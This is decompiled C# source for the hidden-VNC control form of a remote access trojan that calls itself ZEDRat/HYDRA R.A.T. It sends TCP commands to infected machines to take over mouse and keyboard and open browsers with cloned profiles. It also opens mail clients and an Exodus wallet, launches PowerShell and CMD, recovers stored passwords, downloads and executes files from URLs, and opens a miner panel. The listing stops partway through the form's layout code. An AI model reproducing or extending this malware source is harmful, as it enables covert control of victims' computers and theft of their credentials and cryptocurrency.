using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using HYDRA_R.A.T;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Microsoft.VisualBasic.CompilerServices;
using ZEDRatApp.Properties;

namespace ZEDRatApp.Forms
{
	public class FrmVNC : Form
	{
		private bool bool_1;

		private bool bool_2;

		private int int_0;

		private TcpClient tcpClient_0;

		public FrmTransfer FrmTransfer0;

		public FrmMiner Miner_0;

		private IContainer components;

		private BunifuFormDock bunifuFormDock1;

		private MetroSetControlBox metroSetControlBox1;

		private BunifuSeparator bunifuSeparator3;

		private BunifuSeparator bunifuSeparator2;

		private BunifuSeparator bunifuSeparator1;

		private BunifuSeparator bunifuSeparator5;

		private BunifuIconButton bunifuIconButton3;

		private BunifuIconButton bunifuIconButton4;

		private BunifuIconButton bunifuIconButton5;

		private BunifuIconButton bunifuIconButton6;

		private BunifuIconButton bunifuIconButton7;

		private BunifuIconButton bunifuIconButton8;

		private BunifuIconButton bunifuIconButton9;

		private BunifuIconButton bunifuIconButton10;

		private BunifuIconButton bunifuIconButton11;

		private BunifuIconButton bunifuIconButton12;

		private BunifuIconButton bunifuIconButton13;

		private BunifuIconButton bunifuIconButton14;

		private BunifuIconButton bunifuIconButton15;

		private BunifuIconButton bunifuIconButton16;

		private BunifuIconButton bunifuIconButton17;

		private BunifuIconButton bunifuIconButton18;

		private BunifuIconButton bunifuIconButton19;

		private BunifuIconButton bunifuIconButton20;

		private BunifuIconButton bunifuIconButton21;

		private BunifuIconButton bunifuIconButton1;

		private MetroSetTrackBar ResizeScroll;

		private MetroSetTrackBar IntervalScroll;

		private MetroSetTrackBar QualityScroll;

		private BunifuIconButton bunifuIconButton27;

		private BunifuIconButton bunifuIconButton26;

		private BunifuIconButton bunifuIconButton25;

		private BunifuIconButton bunifuIconButton24;

		private BunifuIconButton bunifuIconButton23;

		private BunifuIconButton bunifuIconButton22;

		private BunifuIconButton MinBtn;

		private BunifuIconButton RestoreMaxBtn;

		private MetroSetSwitch chkClone;

		private BunifuIconButton CloseBtn;

		private Label label1;

		private Label IntervalLabel;

		private Label ResizeLabel;

		private Label QualityLabel;

		public StatusStrip statusStrip1;

		private ToolStripStatusLabel toolStripStatusLabel3;

		public ToolStripStatusLabel PingStatusLabel;

		private System.Windows.Forms.Timer timer1;

		private System.Windows.Forms.Timer timer2;

		public PictureBox VNCBox;

		private MetroSetSwitch chkStartStop;

		private BunifuIconButton bunifuIconButton2;

		private Guna2ShadowForm guna2ShadowForm1;

		private BunifuIconButton bunifuIconButton28;

		private BunifuToolTip bunifuToolTip1;

		private BunifuIconButton bunifuIconButton29;

		public string xxip { get; set; }

		public string xhostname { get; internal set; }

		public PictureBox VNCBoxe
		{
			get
			{
				return this.VNCBox;
			}
			set
			{
				this.VNCBox = value;
			}
		}

		public string xip { get; internal set; }

		public FrmVNC()
		{
			this.int_0 = 0;
			this.bool_1 = true;
			this.bool_2 = false;
			this.FrmTransfer0 = new FrmTransfer();
			this.Miner_0 = new FrmMiner();
			this.InitializeComponent();
			this.VNCBox.MouseEnter += new EventHandler(VNCBox_MouseEnter);
			this.VNCBox.MouseLeave += new EventHandler(VNCBox_MouseLeave);
			this.VNCBox.KeyPress += new KeyPressEventHandler(VNCBox_KeyPress);
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public void HydraRecovery()
		{
			this.SendTCP("3308*", (TcpClient)base.Tag);
			Thread.Sleep(500);
		}

		private void VNCBox_MouseEnter(object sender, EventArgs e)
		{
			this.VNCBox.Focus();
		}

		private void VNCBox_MouseLeave(object sender, EventArgs e)
		{
			base.FindForm().ActiveControl = null;
			base.ActiveControl = null;
		}

		private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
		{
			this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
		}

		private void VNCBox_MouseDown(object sender, MouseEventArgs e)
		{
			if (this.bool_1)
			{
				this.bool_1 = false;
				this.timer1.Start();
			}
			else if (this.int_0 < SystemInformation.DoubleClickTime)
			{
				this.bool_2 = true;
			}
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			if (this.bool_2)
			{
				if (e.Button == MouseButtons.Left)
				{
					this.SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
				}
			}
			else if (e.Button == MouseButtons.Left)
			{
				this.SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				this.SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
			}
		}

		private void VNCBox_MouseUp(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
			if (e.Button == MouseButtons.Left)
			{
				this.SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				this.SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
			}
		}

		private void VNCBox_MouseMove(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			this.SendTCP(string.Concat(str3: Conversions.ToString(Math.Ceiling((double)location.Y / num2)), str0: "8*", str1: Conversions.ToString(num3), str2: "*"), this.tcpClient_0);
		}

		private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
		{
			this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
		}

		private void VNCBox_MouseHover(object sender, EventArgs e)
		{
			this.VNCBox.Focus();
		}

		public void Check()
		{
			try
			{
				if (this.FrmTransfer0.FileTransferLabele.Text == null)
				{
					this.toolStripStatusLabel3.Text = "Status";
				}
				else
				{
					this.toolStripStatusLabel3.Text = this.FrmTransfer0.FileTransferLabele.Text;
				}
			}
			catch
			{
			}
		}

		private void timer2_Tick(object sender, EventArgs e)
		{
			this.Check();
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				this.int_0 += 100;
				if (this.int_0 >= SystemInformation.DoubleClickTime)
				{
					this.bool_1 = true;
					this.bool_2 = false;
					this.int_0 = 0;
				}
			}
		}

		private void FrmVNC_KeyPress(object sender, KeyPressEventArgs e)
		{
			this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
		}

		private void btnDisconnect_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				this.SendTCP("24*", this.tcpClient_0);
				base.Close();
			}
		}

		private void btnClose_Click(object sender, EventArgs e)
		{
			base.Hide();
		}

		private void CloseBtn_Click(object sender, EventArgs e)
		{
			this.SendTCP("16*", this.tcpClient_0);
		}

		private void RestoreMaxBtn_Click(object sender, EventArgs e)
		{
			this.SendTCP("15*", this.tcpClient_0);
		}

		private void MinBtn_Click(object sender, EventArgs e)
		{
			this.SendTCP("14*", this.tcpClient_0);
		}

		private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void braveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void operaGXToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("444*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("444*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("21*", this.tcpClient_0);
		}

		private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("4876*", this.tcpClient_0);
		}

		private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("4875*", this.tcpClient_0);
		}

		private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("13*", this.tcpClient_0);
		}

		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("3307*", this.tcpClient_0);
		}

		private void toolStripMenuItem2_Click(object sender, EventArgs e)
		{
			this.SendTCP("3306*" + Clipboard.GetText(), (TcpClient)base.Tag);
		}

		private void StarthVNC_Click(object sender, EventArgs e)
		{
			this.SendTCP("0*", this.tcpClient_0);
			this.FrmTransfer0.FileTransferLabele.Text = "hVNC Started!";
		}

		private void StophVNC_Click(object sender, EventArgs e)
		{
			this.SendTCP("1*", this.tcpClient_0);
			this.VNCBox.Image = null;
			this.FrmTransfer0.FileTransferLabele.Text = "hVNC Stopped!";
			GC.Collect();
		}

		private void thunderbirdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("557*", this.tcpClient_0);
		}

		private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("555*", this.tcpClient_0);
		}

		private void foxMailToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("556*", this.tcpClient_0);
		}

		private void exodosToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("1980*", this.tcpClient_0);
		}

		public void hhURL()
		{
			string text = InputDialog.Show("\nType Your Link Here.\n\n");
			if (!string.IsNullOrEmpty(text))
			{
				this.SendTCP("8585* " + text, (TcpClient)base.Tag);
			}
		}

		public void uUpdateClient()
		{
			string text = InputDialog.Show("\nType Your Link Here.\n\n");
			if (!string.IsNullOrEmpty(text))
			{
				this.SendTCP("8589* " + text, (TcpClient)base.Tag);
			}
		}

		public void hURL(string url)
		{
			this.SendTCP("8585* " + url, (TcpClient)base.Tag);
		}

		public void UpdateClient(string url)
		{
			this.SendTCP("8589* " + url, (TcpClient)base.Tag);
		}

		public void ResetScale()
		{
			this.SendTCP("8587*", (TcpClient)base.Tag);
		}

		public void KillChrome()
		{
			this.SendTCP("8586*", (TcpClient)base.Tag);
		}

		public void PEGASUSRecovery()
		{
			this.SendTCP("3308*", (TcpClient)base.Tag);
			Thread.Sleep(500);
		}

		private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("3308*", (TcpClient)base.Tag);
			Thread.Sleep(500);
		}

		private void updateClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.uUpdateClient();
		}

		private void downloadExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.hhURL();
		}

		private void autoScaleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.ResetScale();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			FrmVNC.ReleaseCapture();
			FrmVNC.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void FrmVNC_Load(object sender, EventArgs e)
		{
			if (this.FrmTransfer0.IsDisposed)
			{
				this.FrmTransfer0 = new FrmTransfer();
			}
			this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
			this.tcpClient_0 = (TcpClient)base.Tag;
			this.VNCBox.Tag = new Size(1028, 1028);
			this.SendTCP("0*", this.tcpClient_0);
		}

		private void FrmVNC_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.SendTCP("1*", this.tcpClient_0);
			this.VNCBox.Image = null;
			GC.Collect();
			base.Hide();
			e.Cancel = true;
		}

		private void chkStartStop_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkStartStop.Switched)
			{
				this.SendTCP("0*", this.tcpClient_0);
				this.FrmTransfer0.FileTransferLabele.Text = "hVNC Started!";
				return;
			}
			this.SendTCP("1*", this.tcpClient_0);
			this.VNCBox.Image = null;
			this.FrmTransfer0.FileTransferLabele.Text = "hVNC Stopped!";
			GC.Collect();
		}

		private void FrmVNC_Click(object sender, EventArgs e)
		{
			this.method_18(null);
		}

		internal void method_18(object object_0)
		{
			base.ActiveControl = (Control)object_0;
		}

		private void btnCocCoc_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("995*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("995*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnSlimjet_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("1001*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("1001*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnAtomBrowser_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("992*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("992*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnWaterfox_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("1005*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("1005*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnAwast_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("993*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("993*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnChromodo_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("994*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("994*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnComodoDragon_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("996*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("996*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnEpic_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("997*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("997*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnOperaNeon_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("998*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("998*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnPalemoon_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("1000*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("1000*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnSputnik_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("1002*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("1002*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btn360_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("991*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("991*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnUC_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("1003*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("1003*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnOrbitum_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("999*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("999*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnVivaldi_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("1004*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("1004*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void btnYandex_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Switched)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("1006*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
			}
			else
			{
				this.SendTCP("1006*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
			}
		}

		private void IntervalScroll_Scroll(object sender)
		{
			this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
			this.SendTCP("17*" + Conversions.ToString(this.IntervalScroll.Value), this.tcpClient_0);
		}

		private void QualityScroll_Scroll(object sender)
		{
			this.QualityLabel.Text = "Quality : " + Conversions.ToString(this.QualityScroll.Value) + "%";
			this.SendTCP("18*" + Conversions.ToString(this.QualityScroll.Value), this.tcpClient_0);
		}

		private void ResizeScroll_Scroll(object sender)
		{
			this.ResizeLabel.Text = "Resize : " + Conversions.ToString(this.ResizeScroll.Value) + "%";
			this.SendTCP("19*" + Conversions.ToString((double)this.ResizeScroll.Value / 100.0), this.tcpClient_0);
		}

		private void bunifuIconButton1_Click(object sender, EventArgs e)
		{
			if (this.Miner_0.IsDisposed)
			{
				this.Miner_0 = new FrmMiner();
			}
			this.Miner_0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
			this.Miner_0.Text = this.Text.Replace("{ HYDRA - Connected: Admin } - ", null);
			this.Miner_0.Show();
		}

		private void FrmVNC_FormClosed(object sender, FormClosedEventArgs e)
		{
			this.SendTCP("1*", this.tcpClient_0);
			this.VNCBox.Image = null;
			GC.Collect();
			base.Hide();
		}

		private void FrmVNC_Load_1(object sender, EventArgs e)
		{
			new Thread((ThreadStart)delegate
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.tcpClient_0 = (TcpClient)base.Tag;
				this.VNCBox.Tag = new Size(1028, 1028);
				this.SendTCP("0*", this.tcpClient_0);
			}).Start();
		}

		private void bunifuIconButton29_Click(object sender, EventArgs e)
		{
			using Help help = new Help();
			help.ShowDialog();
		}

		private void bunifuIconButton28_Click(object sender, EventArgs e)
		{
			this.SendTCP("8586", this.tcpClient_0);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges2 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges3 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges4 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges5 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges6 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges7 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges8 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges9 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges10 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges11 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges12 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges13 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges14 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges15 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges16 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges17 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges18 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges19 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges20 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
